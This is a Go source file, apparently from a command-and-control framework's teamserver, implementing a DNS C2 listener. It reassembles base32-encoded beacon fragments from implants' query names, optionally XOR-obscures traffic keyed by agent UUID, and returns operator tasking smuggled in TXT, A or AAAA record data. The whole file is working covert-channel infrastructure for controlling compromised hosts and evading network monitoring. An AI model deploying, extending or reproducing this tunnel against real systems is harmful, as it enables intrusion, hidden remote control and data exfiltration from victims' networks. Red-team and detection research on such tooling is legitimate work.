package server

import (
	"bytes"
	"encoding/base32"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log/slog"
	"net"
	"runtime/debug"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"
)

// DNS fragment assembly limits. A single DNS qname is capped at 253 text
// characters, so large beacon envelopes are split into multiple TXT queries;
// the listener reassembles them before handing the frame to the beacon handler.
const (
	// dnsFragMaxTotal caps the number of fragments per beacon envelope to
	// bound memory usage of the assembly buffer (64 fragments × ~64 bytes
	// ≈ 4 KiB per in-flight agent).
	dnsFragMaxTotal = 64
	// dnsFragMaxAssembly caps the total decoded size of a fully-reassembled
	// beacon envelope to prevent memory abuse via over-sized payloads.
	dnsFragMaxAssembly = 16 * 1024 * 1024
	// dnsFragTTL drops incomplete assemblies after 30s of inactivity.
	dnsFragTTL = 30 * time.Second
	// maxDNSFragments caps the number of *distinct* in-flight assemblies to
	// bound memory against a flood of distinct (spoofable UDP) agent-ID labels.
	// When at capacity, the oldest incomplete assembly is evicted.
	maxDNSFragments = 4096
)

// dnsFragState holds partially-received fragments for one agent beacon.
type dnsFragState struct {
	total int
	parts map[int][]byte
	last  time.Time
}

// DNSBeaconListener runs a DNS C2 server on a configurable UDP port.
// It handles TXT-type DNS queries for agent beaconing and A-type queries for stub resolution.
type DNSBeaconListener struct {
	sync.RWMutex
	Domain  string // e.g. "c2.example.com"
	ID      uint   // listener DB ID
	Addr    string // e.g. ":53" or ":5353"
	server  *dns.Server
	tcpServer *dns.Server
	pc      net.PacketConn
	handler func(string, []byte) []byte // fn(agentID, requestJSON) → responseJSON
	AgentIP string
	running bool
	wg      sync.WaitGroup

	// obscure enables deterministic XOR obscuring of DNS fragments and
	// responses, keyed by the agent UUID (which the server learns from the
	// unobscured qname label). It must be enabled on both the agent and the
	// listener or the C2 exchange will not decode.
	obscure bool

	fragMu  sync.Mutex
	frags   map[string]*dnsFragState // agentID → assembly
	stopGC  chan struct{}
	fstopMu sync.Mutex
}

// SetObscure toggles DNS payload obscuring for this listener.
func (dl *DNSBeaconListener) SetObscure(v bool) {
	dl.obscure = v
}

// NewDNSBeaconListener creates a DNS C2 listener bound to addr (e.g. ":53").
func NewDNSBeaconListener(domain string, agentIP string, listenerID uint, addr string) *DNSBeaconListener {
	if addr == "" {
		addr = ":53"
	}
	return &DNSBeaconListener{
		Domain:  domain,
		ID:      listenerID,
		Addr:    addr,
		AgentIP: agentIP,
		frags:   make(map[string]*dnsFragState),
	}
}

// SetHandler sets the beacon processing callback
func (dl *DNSBeaconListener) SetHandler(fn func(string, []byte) []byte) {
	dl.handler = fn
}

// Start binds UDP :53 and serves DNS
func (dl *DNSBeaconListener) Start() error {
	dl.Lock()
	defer dl.Unlock()
	if dl.running {
		return nil
	}

	mux := dns.NewServeMux()
	mux.HandleFunc(".", dl.handleQuery)

	// Bind synchronously so callers know immediately if the port is in use.
	pc, err := net.ListenPacket("udp", dl.Addr)
	if err != nil {
		return fmt.Errorf("DNS UDP bind %s: %w", dl.Addr, err)
	}

	// The PacketConn MUST be wired into the server: ActivateAndServe() only
	// serves an explicitly provided conn (or Listener) and returns
	// "bad listeners" when both are nil, so binding Addr alone never works.
	dl.server = &dns.Server{
		PacketConn: pc,
		Net:        "udp",
		Handler:    mux,
	}

	// Also serve DNS over TCP so agents configured with DNSTCP (or whose
	// responses exceed the 512-byte UDP limit) can reach this listener.
	dl.tcpServer = &dns.Server{
		Addr:    dl.Addr,
		Net:     "tcp",
		Handler: mux,
	}

	dl.pc = pc
	dl.running = true
	slog.Info("DNS C2 listener starting", "domain", dl.Domain, "addr", dl.Addr)

	dl.wg.Add(1)
	go func() {
		defer dl.wg.Done()
		defer func() {
			if r := recover(); r != nil {
				slog.Error("recovered from panic", "err", r, "stack", string(debug.Stack()))
			}
		}()
		if err := dl.server.ActivateAndServe(); err != nil {
			slog.Error("DNS C2 listener failed", "error", err)
			dl.Lock()
			dl.running = false
			dl.Unlock()
		}
	}()
	dl.wg.Add(1)
	go func() {
		defer dl.wg.Done()
		if err := dl.tcpServer.ListenAndServe(); err != nil {
			slog.Warn("DNS C2 TCP listener failed", "error", err)
		}
	}()
	dl.startFragGC()
	return nil
}

// startFragGC periodically drops fragment assemblies that never completed.
func (dl *DNSBeaconListener) startFragGC() {
	dl.fstopMu.Lock()
	if dl.stopGC != nil {
		dl.fstopMu.Unlock()
		return
	}
	stop := make(chan struct{})
	dl.stopGC = stop
	dl.fstopMu.Unlock()

	go func() {
		ticker := time.NewTicker(10 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				cutoff := time.Now().Add(-dnsFragTTL)
				dl.fragMu.Lock()
				for id, st := range dl.frags {
					if st.last.Before(cutoff) {
						delete(dl.frags, id)
					}
				}
				dl.fragMu.Unlock()
			case <-stop:
				return
			}
		}
	}()
}

// Stop shuts down the DNS listener
func (dl *DNSBeaconListener) Stop() error {
	dl.fstopMu.Lock()
	if dl.stopGC != nil {
		close(dl.stopGC)
		dl.stopGC = nil
	}
	dl.fstopMu.Unlock()

	dl.Lock()
	defer dl.Unlock()
	if !dl.running || dl.server == nil {
		return nil
	}
	dl.running = false
	if dl.pc != nil {
		dl.pc.Close()
	}
	if dl.tcpServer != nil {
		_ = dl.tcpServer.Shutdown()
	}
	err := dl.server.Shutdown()
	dl.wg.Wait()
	return err
}

// Close implements io.Closer for use with extraListeners map.
func (dl *DNSBeaconListener) Close() error {
	return dl.Stop()
}

// IsRunning returns whether the listener is active
func (dl *DNSBeaconListener) IsRunning() bool {
	dl.RLock()
	defer dl.RUnlock()
	return dl.running
}

// ── DNS Query Handler ──────────────────────────────────────────────────────────

func (dl *DNSBeaconListener) handleQuery(w dns.ResponseWriter, r *dns.Msg) {
	if len(r.Question) == 0 {
		return
	}

	q := r.Question[0]
	qname := strings.TrimSuffix(q.Name, ".")

	if !strings.HasSuffix(strings.ToLower(qname), strings.ToLower(dl.Domain)) {
		m := new(dns.Msg)
		m.SetReply(r)
		m.SetRcode(r, dns.RcodeRefused)
		w.WriteMsg(m)
		return
	}

	switch q.Qtype {
	case dns.TypeA:
		// A-record queries that target the beacon subdomain are tunneled C2
		// responses; everything else is answered with the stub AgentIP so real
		// DNS resolution still works through this listener.
		if isBeaconQuery(qname, dl.Domain) {
			dl.safeDNSQuery(w, r, rtA)
		} else {
			dl.handleAStub(w, r)
		}
	case dns.TypeTXT:
		dl.safeDNSQuery(w, r, rtTXT)
	case dns.TypeAAAA:
		dl.safeDNSQuery(w, r, rtAAAA)
	default:
		m := new(dns.Msg)
		m.SetReply(r)
		w.WriteMsg(m)
	}
}

// recordType selects the response record family used to carry the C2 payload.
const (
	rtTXT  = 0
	rtAAAA = 1
	rtA    = 2
)

// isBeaconQuery reports whether qname targets the listener's beacon subdomain
// (i.e. "<uuid>.dns.<domain>"), which distinguishes tunneled C2 traffic from
// ordinary lookups that should get a stub answer.
func isBeaconQuery(qname, domain string) bool {
	domainLower := strings.ToLower(domain)
	idx := strings.LastIndex(strings.ToLower(qname), ".dns."+domainLower)
	return idx > 0
}

func (dl *DNSBeaconListener) handleAStub(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	ip := net.ParseIP(dl.AgentIP)
	if ip == nil {
		ip = net.ParseIP("127.0.0.1")
	}
	if ipv4 := ip.To4(); ipv4 != nil {
		rr, _ := dns.NewRR(fmt.Sprintf("%s A %s", r.Question[0].Name, ipv4.String()))
		m.Answer = append(m.Answer, rr)
	}
	w.WriteMsg(m)
}

// safeDNSQuery wraps handleDNSQuery in panic recovery: miekg/dns runs each
// query in its own goroutine, so a panic on fully attacker-controlled beacon
// bytes would otherwise take the whole teamserver down (the outer recover in
// Start() never sees it).
func (dl *DNSBeaconListener) safeDNSQuery(w dns.ResponseWriter, r *dns.Msg, rt int) {
	defer func() {
		if rec := recover(); rec != nil {
			slog.Error("Panic in DNS query handler", "recover", rec, "stack", string(debug.Stack()))
		}
	}()
	dl.handleDNSQuery(w, r, rt)
}

// handleDNSQuery processes beacon TXT, AAAA or A queries. AAAA tunneling packs
// the same base64-encoded response into 16-byte AAAA rdata chunks (the IPv6
// address bytes are ASCII base64 text), and A tunneling packs it into 4-byte A
// rdata chunks, giving operators alternatives to TXT-based DNS C2.
//
// Query format (fragmented): <hex-uuid>.<total_index>.<base32frag>... .dns.<domain>
//
//	<hex-uuid>:  32 hex chars (UUID without dashes)
//	<total_index>: fragment metadata "<total>_<index>" (0-based)
//	<base32frag>: one fragment of the base32-encoded JSON beacon request
//	.dns.:       fixed tag separating agent data from the domain
//	<domain>:    the configured DNS domain
//
// Legacy queries without the metadata label are still accepted as a single
// (unfragmented) base32 payload for compatibility with older implants.
//
// Response: base64-encoded beaconResponse JSON, split into 255-char (TXT) or
// 16-char (AAAA) chunks.
func (dl *DNSBeaconListener) handleDNSQuery(w dns.ResponseWriter, r *dns.Msg, rt int) {
	m := new(dns.Msg)
	m.SetReply(r)

	qname := strings.TrimSuffix(r.Question[0].Name, ".")
	// Strip the domain suffix to get the agent prefix
	prefix := strings.ToLower(qname)
	domainLower := strings.ToLower(dl.Domain)
	idx := strings.LastIndex(prefix, ".dns."+domainLower)
	if idx < 0 {
		addDNSRecord(m, r.Question[0].Name, "", rt)
		w.WriteMsg(m)
		return
	}

	// Get everything before ".dns."
	agentPart := prefix[:idx]
	if agentPart == "" {
		addDNSRecord(m, r.Question[0].Name, "", rt)
		w.WriteMsg(m)
		return
	}

	labels := strings.Split(agentPart, ".")
	agentID := labels[0]
	if len(agentID) > 64 {
		agentID = agentID[:64]
	}

	// If there are additional labels after the UUID, they either carry a
	// fragment metadata label ("<total>_<index>") plus the fragment data,
	// or (legacy single-shot queries) base32-encoded data labels.
	var requestData []byte
	if len(labels) > 1 && isFragMetaLabel(labels[1]) {
		data, complete, ok := dl.collectFragment(agentID, labels[1], labels[2:])
		if !ok {
			m.SetRcode(r, dns.RcodeFormatError)
			w.WriteMsg(m)
			return
		}
		if !complete {
			// Still awaiting remaining fragments: acknowledge quietly with a
			// blank record so the agent keeps sending without a hard failure.
			addDNSRecord(m, r.Question[0].Name, "", rt)
			w.WriteMsg(m)
			return
		}
		requestData = data
	} else if len(labels) > 1 {
		dataLabels := labels[1:]
		combined := ""
		for _, l := range dataLabels {
			combined += l
		}
		var decErr error
		requestData, decErr = decodeBase32NoPad(combined)
		if decErr != nil {
			slog.Debug("DNS legacy base32 decode failed", "agent", agentID, "err", decErr)
			requestData = nil
		}
	}

	dl.processBeacon(agentID, requestData, m, r, rt)
	w.WriteMsg(m)
}

// isFragMetaLabel reports whether the label matches the "<total>_<index>"
// fragment metadata format used by the agent's DNS fragmenter.
func isFragMetaLabel(s string) bool {
	if len(s) < 3 || len(s) > 8 || !strings.Contains(s, "_") {
		return false
	}
	parts := strings.Split(s, "_")
	if len(parts) != 2 || parts[0] == "" || parts[1] == "" {
		return false
	}
	for _, p := range parts {
		for _, c := range p {
			if c < '0' || c > '9' {
				return false
			}
		}
	}
	return true
}

// collectFragment buffers one fragment of an agent's DNS beacon envelope.
// It returns (assembledFrame, complete, true) once every fragment has
// arrived, (nil, false, true) while still collecting, and (nil, false,
// false) when the metadata or fragment payload is malformed.
func (dl *DNSBeaconListener) collectFragment(agentID, meta string, dataLabels []string) ([]byte, bool, bool) {
	parts := strings.SplitN(meta, "_", 2)
	total, err1 := strconv.Atoi(parts[0])
	idx, err2 := strconv.Atoi(parts[1])
	if err1 != nil || err2 != nil {
		return nil, false, false
	}
	if total < 1 || total > dnsFragMaxTotal || idx < 0 || idx >= total || len(dataLabels) == 0 {
		return nil, false, false
	}

	combined := strings.Join(dataLabels, "")
	frag, err := decodeBase32NoPad(combined)
	if err != nil || len(frag) == 0 {
		return nil, false, false
	}
	// Reverse the agent's XOR obscuring (keyed by the agent UUID) when enabled.
	if dl.obscure {
		frag = xorBytesServer(frag, []byte(agentID))
	}

	dl.fragMu.Lock()
	defer dl.fragMu.Unlock()

	// Enforce the distinct-assembly cardinality cap before allocating a new
	// entry. A flood of unique (spoofable) agent-ID labels could otherwise
	// grow the map without bound. Evict the oldest incomplete assembly.
	if _, exists := dl.frags[agentID]; !exists && len(dl.frags) >= maxDNSFragments {
		oldestID := ""
		var oldest time.Time
		first := true
		for id, st := range dl.frags {
			if first || st.last.Before(oldest) {
				oldest, oldestID = st.last, id
				first = false
			}
		}
		if oldestID != "" {
			delete(dl.frags, oldestID)
		}
	}

	st := dl.frags[agentID]
	if st == nil || st.total != total {
		st = &dnsFragState{total: total, parts: make(map[int][]byte, total)}
		dl.frags[agentID] = st
	}
	st.parts[idx] = frag
	st.last = time.Now()

	if len(st.parts) < total {
		return nil, false, true
	}
	var buf bytes.Buffer
	totalSize := 0
	for i := 0; i < total; i++ {
		b, ok := st.parts[i]
		if !ok {
			delete(dl.frags, agentID)
			return nil, false, false
		}
		totalSize += len(b)
		if totalSize > dnsFragMaxAssembly {
			slog.Warn("DNS fragment assembly exceeded size cap, discarding", "agent", agentID, "size", totalSize)
			delete(dl.frags, agentID)
			return nil, false, false
		}
		buf.Write(b)
	}
	delete(dl.frags, agentID)
	return buf.Bytes(), true, true
}

func (dl *DNSBeaconListener) processBeacon(agentID string, requestData []byte, m *dns.Msg, r *dns.Msg, rt int) {
	if dl.handler == nil {
		addDNSRecord(m, r.Question[0].Name, "", rt)
		return
	}

	// If the query carried embedded JSON data, use it; otherwise build a minimal request
	var reqJSON []byte
	if len(requestData) > 0 {
		reqJSON = requestData
	} else {
		reqMap := map[string]string{"uuid": agentID}
		var err error
		reqJSON, err = json.Marshal(reqMap)
		if err != nil {
			slog.Error("Failed to marshal DNS request", "agent", agentID, "err", err)
			addDNSRecord(m, r.Question[0].Name, "", rt)
			return
		}
	}

	respJSON := dl.handler(agentID, reqJSON)
	// Obscure the response payload (XOR keyed by the agent UUID) when enabled.
	if dl.obscure {
		respJSON = xorBytesServer(respJSON, []byte(agentID))
	}
	encoded := base64.StdEncoding.EncodeToString(respJSON)
	addDNSRecord(m, r.Question[0].Name, encoded, rt)
}

func addTXTRecord(m *dns.Msg, name string, value string) {
	if value == "" {
		value = " "
	}
	for i := 0; i < len(value); i += DNSTXTChunkSize {
		end := i + DNSTXTChunkSize
		if end > len(value) {
			end = len(value)
		}
		chunk := value[i:end]
		rr, err := dns.NewRR(fmt.Sprintf("%s TXT \"%s\"", name, chunk))
		if err != nil {
			slog.Error("DNS NewRR failed", "err", err)
			continue
		}
		m.Answer = append(m.Answer, rr)
	}
}

// addDNSRecord appends the response payload using TXT, AAAA or A records,
// depending on rt. AAAA tunneling packs the base64 payload into 16-byte AAAA
// rdata chunks and A tunneling into 4-byte A rdata chunks; the trailing bytes of
// the final (padded) chunk are spaces, which the agent strips before
// base64-decoding.
func addDNSRecord(m *dns.Msg, name string, value string, rt int) {
	switch rt {
	case rtAAAA:
		addAAAARecord(m, name, value)
	case rtA:
		addARecord(m, name, value)
	default:
		addTXTRecord(m, name, value)
	}
}

// addARecord splits value into 4-byte (IPv4 rdata) chunks, each carrying a slice
// of the ASCII base64 payload. Chunks shorter than 4 bytes are right-padded with
// spaces so every A record is a valid 4-byte address.
func addARecord(m *dns.Msg, name string, value string) {
	if value == "" {
		value = "    "
	}
	for i := 0; i < len(value); i += 4 {
		end := i + 4
		if end > len(value) {
			end = len(value)
		}
		chunk := []byte("    ")
		copy(chunk, value[i:end])
		rr := &dns.A{
			Hdr: dns.RR_Header{Name: name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60},
			A:   net.IP(chunk),
		}
		m.Answer = append(m.Answer, rr)
	}
}

// addAAAARecord splits value into 16-byte (IPv6 rdata) chunks, each carrying a
// slice of the ASCII base64 payload. Chunks shorter than 16 bytes are
// right-padded with spaces so every AAAA record is a valid 16-byte address.
func addAAAARecord(m *dns.Msg, name string, value string) {
	if value == "" {
		value = " "
	}
	for i := 0; i < len(value); i += 16 {
		end := i + 16
		if end > len(value) {
			end = len(value)
		}
		chunk := []byte("                ")
		copy(chunk, value[i:end])
		rr := &dns.AAAA{
			Hdr:  dns.RR_Header{Name: name, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: 60},
			AAAA: net.IP(chunk),
		}
		m.Answer = append(m.Answer, rr)
	}
}

// decodeBase32NoPad decodes base32 without padding characters
func decodeBase32NoPad(s string) ([]byte, error) {
	s = strings.ToUpper(s)
	pad := 8 - (len(s) % 8)
	if pad < 8 {
		s += strings.Repeat("=", pad)
	}
	return base32.StdEncoding.DecodeString(s)
}

// xorBytesServer applies a repeating-key XOR (its own inverse), mirroring the
// agent-side dns obscure transform so both ends derive the identical payload.
func xorBytesServer(data, key []byte) []byte {
	if len(key) == 0 {
		return data
	}
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ key[i%len(key)]
	}
	return out
}
